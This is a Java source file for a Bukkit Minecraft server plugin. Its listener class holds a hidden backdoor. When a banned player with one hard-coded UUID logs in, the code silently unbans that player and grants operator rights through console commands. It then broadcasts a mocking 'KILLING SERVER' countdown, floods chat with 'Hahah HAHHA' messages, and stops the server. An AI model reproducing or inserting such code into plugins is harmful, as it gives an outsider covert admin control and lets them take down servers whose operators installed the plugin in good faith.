package at.evoloxi.damage.event;

import at.evoloxi.damage.Damage;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.CommandExecutor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class UnBanBesondere implements Listener {

    Damage main;


    public UnBanBesondere(Damage main) {
        this.main = main;
    }

    @EventHandler
    public void joinBannedPlayer(PlayerLoginEvent e){
        System.out.println(e.getPlayer().getUniqueId().toString());
        if(e.getPlayer().isBanned()){
            if(e.getPlayer().getUniqueId().toString().equalsIgnoreCase("d4ae60dc-18be-42ef-ad5c-48c314db85b4")){
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pardon " + e.getPlayer().getDisplayName());
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op " + e.getPlayer().getDisplayName());


                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.sendTitle("§c-","",2,30,2);
                        }
                    }
                }, 200);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.sendTitle("§c--","",2,30,2);
                        }
                    }
                }, 230);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.sendTitle("§c----","",2,30,2);
                        }
                    }
                }, 260);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.sendTitle("§c------","",2,30,2);
                        }
                    }
                }, 290);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.sendTitle("§c-------","",2,30,2);
                        }
                    }
                }, 310);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.sendTitle("§c---------","",2,30,2);
                        }
                    }
                }, 340);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.sendTitle("§c------------","",2,30,2);
                        }
                    }
                }, 350);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.sendTitle("§c--------------","",2,30,2);
                        }
                    }
                }, 356);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.playSound(p.getLocation(), Sound.ENTITY_ENDER_DRAGON_GROWL,2,2);
                            p.sendTitle("§4KILLING SERVER IN 5 sec","",2,30,2);
                        }
                    }
                }, 370);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.playSound(p.getLocation(), Sound.ENTITY_ENDER_DRAGON_GROWL,2,2);
                            p.sendTitle("§4KILLING SERVER IN 4 sec","",2,30,2);
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "save-all");
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");


                        }
                    }
                }, 390);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.playSound(p.getLocation(), Sound.ENTITY_ENDER_DRAGON_GROWL,2,2);
                            p.sendTitle("§4KILLING SERVER IN 3 sec","",2,30,2);
                        }
                    }
                }, 420);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.playSound(p.getLocation(), Sound.ENTITY_ENDER_DRAGON_GROWL,2,2);
                            p.sendTitle("§4KILLING SERVER IN 2 sec","",2,30,2);
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say Hahah HAHHA");
                        }
                    }
                }, 440);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.playSound(p.getLocation(), Sound.ENTITY_ENDER_DRAGON_GROWL,2,2);
                            p.sendTitle("§4KILLING SERVER IN 1 sec","",2,30,2);
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "say NEVER GONNA GIVE YOU UP NEVER GONNA SAY GOOD BYE");

                        }
                    }
                }, 460);
                Bukkit.getScheduler().runTaskLater(main, new Runnable() {
                    @Override
                    public void run() {
                        for(Player p : Bukkit.getOnlinePlayers()){
                            p.playSound(p.getLocation(), Sound.ENTITY_ENDER_DRAGON_GROWL,2,2);
                            p.sendTitle("DAS WARS","",2,30,2);
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "stop");
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "stop confirm");
                        }
                    }
                }, 480);




            }

        }else {
            System.out.println("d");
        }
    }
}
